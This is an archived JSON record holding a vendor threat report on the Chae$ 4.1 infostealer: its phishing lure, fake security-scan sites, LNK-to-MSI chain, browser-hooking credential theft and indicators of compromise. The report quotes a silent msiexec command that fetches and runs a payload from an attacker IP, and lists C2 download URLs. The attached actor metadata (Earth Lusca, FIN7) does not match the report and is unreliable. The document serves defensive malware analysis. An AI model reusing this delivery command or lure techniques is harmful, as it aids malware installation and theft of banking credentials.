{
    "id": "a279251f-2bb3-458e-ab70-705f1d28f4eb",
    "created_at": "2024-02-03T02:06:12.84124Z",
    "updated_at": "2025-03-27T02:15:35.493087Z",
    "deleted_at": null,
    "sha1_hash": "94601668e4150ad9358c2a3f6284302564d79332",
    "title": "",
    "authors": "",
    "file_creation_date": "2024-01-17T15:18:35Z",
    "file_modification_date": "2024-01-17T15:18:39Z",
    "file_size": 1964981,
    "plain_text": "#### THREAT PROFILE\n# CHAE$ CHRONICLES\n\n## Version 4.1\u0003 dedicated\n to Morphisec\u0003 researchers\n\n\n-----\n\n##### Table Of Contents\n\n###### Introduction................................................................................................................................................................. 3\n\n Infection Chain........................................................................................................................................................... 3\n\n Email........................................................................................................................................................................... 3\n\n Attacker Controlled Websites | Fake/Compromised Websites.............................................4\n\n Downloaded ZIP.................................................................................................................................................6\n\n LNK...............................................................................................................................................................................6\n\n MSI Installer............................................................................................................................................................6\n\n Chronod Module................................................................................................................................................. 7\n\n How Morphisec Helps...........................................................................................................................................11\n\n IOCs (Indications of Compromise)..............................................................................................................12\n\n MSI Installer...........................................................................................................................................................12\n\n ZIP...............................................................................................................................................................................12\n\n Fake/Compromised Websites...................................................................................................................12\n\n LNK..............................................................................................................................................................................13\n\n MSI Installer Downloaded from...............................................................................................................13\n\n\n-----\n\n### Introduction\n\nIn ongoing efforts to monitor and analyze emerging cyber threats, Morphisec Threat Labs\n\nhas recently turned its focus to Chae$ 4.1, an update to the Chaes malware Infostealer series.\n\nThis version introduces key updates, including an improved Chronod module, and features\n\na unique aspect: a direct message to the Morphisec team within the source code.\n\nThis analysis will cover the updates in Chae$ 4.1 and mention Morphisec’s initial interaction with\n\nthe hackers, it will also cover several previously unknown details of the delivery chain.\n\n### Infection Chain\n\n100KB\n\nEmail Compromised ZIP LNK MSI\nWebsite Installer\n\n100MB\n\n###### Email\n\nThe infection chain starts with an email written in Portuguese, which purports to be an urgent\n\ncommunication request from a lawyer regarding a legal case. The email pressured the victim with\n\nan urgent call for “prompt response”, or risk highly adverse legal repercussions. The email includes\n\na link and a password to access the document from that link.\n\n\n-----\n\n###### Attacker Controlled Websites | Fake/Compromised Websites\n\nUpon clicking the provided link, the victim will be redirected to `https://totalavprotection[.]shop/`\n```\nabrirProcesso.php?email=<victims_email>. Then, the victim will be prompted to input the provided\n\n```\npassword to download the document, which is a ZIP file. This website https://totalavprotection[.]\n```\nshop additionally functions as a deceptive website for TotalAV, directly delivering the MSI installer\n\n\n```\nwithout the intermediary step of a ZIP file.\n\nYet another website delivering the\n\nmalicious payload directly as an MSI installer\n```\nhttps://www.webcamcheck[.]online/ — a\n\n```\nwebsite that allegedly scans the machine\n\nfor risks and suggests updating the machine’s\n\ndriver after “scanning”. After the victim\n\nclicks the BLOCK button (marked in red), a\n\nJavaScript is executed in the background.\n\nThe script is designed to mimic the\n\nappearance of a legitimate system scan.\n\nDuring the simulated scan, a hardcoded\n\nlist of files is presented, giving the illusion of a\n\ncomprehensive analysis of the victim’s computer.\n\n\n-----\n\nFollowing the scan, the victim is then shown with a crafted message: “Security Risk Detected” and\n\nurges the victim to download an updated driver to install the latest version and eliminate the risk.\n\nClicking the button triggers the execution of a script named download.js. Whose purpose is to\n\nsmuggle the malicious installer by decoding a zipped base64 blob.\n\nThese examples illustrate the utilization of fake websites for delivering the malicious payload.\n\n[Moreover, the threat actor implants the following PHP Webshells on compromised WordPress](https://github.com/b374k/b374k)\n\nwebsites. This open-source tool enables web administrators to perform remote management\n\nwithout the use of cPanel. We assess that the threat actor is using it to push the malicious payload\n\non those WordPress websites. For instance - https://chpost.eu[.]org/wp-content/Nota_%20\n```\n2012236549%20.zip\n\n```\n\n-----\n\n###### Downloaded ZIP\n\nThe download ZIP archive contains an LNK file named “Visualizar” (translated to Visualize in\n\nPortuguese) which matches the lure email.\n\n###### LNK\n\nWithin the ZIP archive, there is an LNK file. Clicking this file initiates the execution of msiexec.exe,\n\nfacilitating the remote download and execution of the next stage payload in silent mode with no\n\nuser interface.\n```\n%systemroot%\\system32\\msiexec.exe /i http://54.207.253[.]173/DjXR/187/ogohude.msi /qn.\n\n```\n**•  \u0007The C2 server only serves the payload upon receiving a request triggered by**\n\nthe execution of msiexec and has the following format: <C2 address>/*/*/*.msi.\n\nThis determination is made on the server side by checking whether the User-Agent\n\nequals `Windows Installer (which automatically prepend when msiexec requests the`\n\npayload). Any alternative value for the User-Agent will result in the following:\n\n###### MSI Installer\n\n\nThe downloaded MSI installer executes identical operations, whether obtained directly from the\n\nfake website or through the ZIP→LNK infection chain. The distinguishing factor lies in their size.\n\nOrdinarily, the version acquired directly from the deceptive or compromised website carries an\n\n[approximate weight of ~100MB, resembling the one detailed in our prior report. In contrast, the](https://engage.morphisec.com/chaes4-threat-profile)\n\nversion downloaded via the LNK infection chain removes padding from the JS script within the\n\nMSI, resulting in a reduced weight of just ~100KB.\n\n\n-----\n\n[From this point onward, the attack chain remains similar to Morphisec’s previous analysis, except](https://blog.morphisec.com/chaes4-new-chaes-malware-variant-targeting-financial-and-logistics-customers)\n\nfor some adjustments in the Chae$ framework. It has advanced from version 4 to 4.1, primarily\n\ncharacterized by modifications in the Chronod module.\n\n_The full components of Chae$, as reviewed in the analysis of_ _[Chae$4](https://blog.morphisec.com/chaes4-new-chaes-malware-variant-targeting-financial-and-logistics-customers)_\n\n###### Chronod Module\n\n\nAs we described in our previous report the Chronod module is responsible for intercepting\n\nbrowser activity to steal information from the victim such as credentials sent on a login process,\n\nbanking information when communicating with the bank’s website, and has a clipping\n\nfunctionality. We also mentioned this functionality spans more than 2,000 lines of code. The code\n\nhas been adjusted to steal credentials from specific services such as WhatsApp, AWS, WordPress,\n\netc., and a total of 25 such services (a full list can be found in the appendix of our previous report)\n\nwith designated functionality for each service. However, in version 4.1 Chae$ team rewrote the\n```\nChronod module to be more generic and modular, instead of one class responsible for all of the\n\n```\nfunctionality, they divided the logic into several classes.\n\n\n-----\n\nThe image above reveals a snipped code from the main class within the Chronod module. This class\n\ninherits from ChronodInternal, a class that leverages Google’s DevTools for managing various\n\ncallbacks and establishing communication with Chromium based browsers. Among the browser\n\nhook callbacks integrated into this class are:\n\n**1.  \u0007hook_obta - Adds JS scripts to be evaluated on new document creation, including**\n\none that overrides the webdriver property in the browser’s navigator object. It also\n\noptionally adds a nice ASCII art banner if debug_mode is enabled.\n\n\n-----\n\n**2.** `hook_obclo - Attached to the browser close event.`\n\n**3.  \u0007hook_obmsg - Attached to browser messages, this hook, in particular, manages**\n\nmessages associated with network requests, specifically those tied to\n```\n      Network.requestWillBeSent. This hook examines all POST requests made by a browser\n\n```\nand checks whether the request’s POST data aligns with a generic credit card or\n\ngeneric login attempt. This evaluation is conducted by checking for the presence of\n\nfields related to login attempts (such as user, password etc.) or credit card information\n\n(including card, cc, cvv etc.)\n\nChae$ team also uses the hooking infrastructure to handle the injection of the JS script\n\nresponsible for replacing the QR Code in PIX transactions. Additionally, they have added the\n\nfollowing “eco-friendly” ASCII art which is displayed when running in debug mode.\n\n\n-----\n\nThe stolen data, typically accompanied by a screenshot capturing the victim’s machine state\n\nat the time of theft, is sent to the C2 using the TsApi class. This class functions as a client,\n\nmanaging C2 communication and the encryption/decryption of requests. This class retrieves its\n\nC2 dynamically, similar to how it was handled in previous versions, by sending a DNS TXT record\n\nto cloudflare-dns.com.\n\nExamining the C2s employed\n\nthroughout distinct phases\n\nof the framework unveils the\n\npresence of the Chae$ team\n\npanel login page.\n\nAnother interesting update was made in the Class responsible for parsing QrCodes, Chae$ team\n\nstarted using opencv-python to parse the QrCodes. But that is not just it, in that class they have\n\nadded a function named greetings with a message to Morphisec security researchers, specifically\n\naddressing our latest research.\n\nThe threat actor has a history\n\nof expressing appreciation to\n\nsecurity researchers for helping\n\nin the improvement of their\n\n“software.” However, this is\n\nthe first time such gratitude\n\nhas been expressed directly\n\nwithin the code.\n\n\n-----\n\n### How Morphisec helps\n\n[Morphisec’s Automated Moving Target Detection (AMTD) uses a preventative approach to](https://www.morphisec.com/moving-target-defense)\n\ncybersecurity, using an ultra-lightweight agent to block unauthorized processes deterministically,\n\nrather than probabilistically. Protecting over 7,000 organizations and deployed at over nine million\n\nendpoints, Morphisec’s AMTD technology prevents unauthorized code from executing, regardless\n\nof whether a recognizable signature or behavior pattern exists.\n\n**If you don’t believe us, ask the Chae$ group:**\n\n**Schedule a demo to experience Morpisec’s advanced anti-ransomware, endpoint protection**\n\n**and risk-based vulnerability prioritization. Reduce Risk Now.**\n\n\n-----\n\n### IOCs (Indications of Compromise)\n\n###### MSI Installer\n\n\n**•  cc1afdb84e6ccc25f2041fb047caa5d577078441b206b72167020bba0b6156dd**\n\n**•  9bfa1c32f509446249818ab67e27a4584c944a664fae20f85377ac59caa4bf5f**\n\n**•  95b7199d5caa6809c3fd70fdca3e9eab3c3d4b4d86a56f88e2092fe0f86f0ccb**\n\n**•  1d1cff7cff0a9b838414143191562b27f97a61478d346c782932cb5a47d953c8**\n\n**•  11db58e5e49eaabc38425f8e3f3f989537aee2895b7dd01c765fce7a778116e2**\n\n**•  15b2756beabc65250c119921ede423eed0b83d1f436b9fabf3c07d71b2497590**\n\n**•  42405490d116cdf0c898b7b7f2e355084338b53505ac1ac7102f1a3f48139360**\n\n**•  7408ed9ac9be64eede8fd21ded0e546192766984bf2d90384c1c0259ef3d2481**\n\n**•  7e1348cb45fe5acf125895b1c3cb869c18a571a48f83ec188594a91a4b5d03c0**\n\n###### ZIP\n\n**•  1c2aaa9e1d2deda545c8f246b933fa91b13ce682dcacbe7cd1611497ea84baf0**\n\n**•  d0cdb151932052acc96db00f7442edbbefedfc7aea748e51d0240e1436a4b733**\n\n**•  3116c8e6711c12bc06ac26e0dbcc6870bd8207477363e49532a72ceb8d4f2543**\n\n**•  636369d9dcd9fbe090a7e7ac300faf1721da7559841546031543dd5f85e0a50e**\n\n###### Fake/Compromised Websites\n\n**•  https://chpost.eu[.]org/wp-content/Nota_%202012236549%20.zip**\n\n**•  https://www.webcamcheck[.]online/**\n\n**•  https://totalavprotection[.]shop**\n\n\n-----\n\n###### LNK\n\n**•  25c00a6f953ee9d11a52b1f8aa0535af426cdb79e8210b6d45bf6ae16b888967**\n\n**•  458b5628dad53eef7da5339191796a636b6bd2433101e3cb6cbc43e7566cbdfe**\n\n**•  6a6254e7bc584cc8a1c9c590bf9288ed94cd6f95494cf39232693fe5101d5b07**\n\n**•  e105d40ce206f89701310c476c7a38c82ea69e1a41b32f23fe6babf7397d6c7b**\n\n###### MSI Installer Downloaded from\n\n**•  http://54.207.253[.]173/DjXR/187/ogohude.msi**\n\n**•  http://54.207.253[.]173/xMFu/228/iqesubadolatec.msi**\n\n**•  http://54.207.253[.]173/kmsh/244/oderilupufitebej.msi**\n\n**•  http://54.207.253[.]173/ppp4/8/elociliqa.msi**\n\n**•  http://54.207.50[.]210/ocudod.msi**\n\n\n-----\n\n##### About Morphisec\n\n###### Morphisec provides prevention-first security against the most advanced threats to\n\n stop the \u0003attacks that others don’t, from endpoint to the cloud. Morphisec’s software is\n\n powered by Automated Moving Target Defense (AMTD) technology, the next evolution\n\n of cybersecurity. \u0003AMTD stops ransomware, supply chain attacks, zero-days, and other\n\n advanced attacks. \u0003Gartner® research shows that AMTD is the future of cyber. AMTD\n\n provides an ultra-lightweight, Defense-in-Depth security layer to augment solutions\n\n like NGAV, EPP and EDR/XDR. We close their runtime memory security gap against the\n\n undetectable cyberattacks with no performance impact or extra staff needed. Over\n\n 7,000 organizations trust Morphisec to protect nine million Windows and Linux servers,\n\n workloads, and endpoints. Morphisec stops thousands of advanced attacks daily at\n\n Lenovo, Motorola, TruGreen, Covenant Health, Citizens Medical Center, and many more.\n\n##### To learn more, visit morphisec.com/schedule\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.morphisec.com/hubfs/Chae$_Chronicles_Chaes4.1.pdf"
    ],
    "report_names": [
        "Chae$_Chronicles_Chaes4.1.pdf"
    ],
    "threat_actors": [
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1706925972,
    "ts_updated_at": 1743041735,
    "ts_creation_date": 1705504715,
    "ts_modification_date": 1705504719,
    "files": {
        "pdf": "https://archive.orkl.eu/94601668e4150ad9358c2a3f6284302564d79332.pdf",
        "text": "https://archive.orkl.eu/94601668e4150ad9358c2a3f6284302564d79332.txt",
        "img": "https://archive.orkl.eu/94601668e4150ad9358c2a3f6284302564d79332.jpg"
    }
}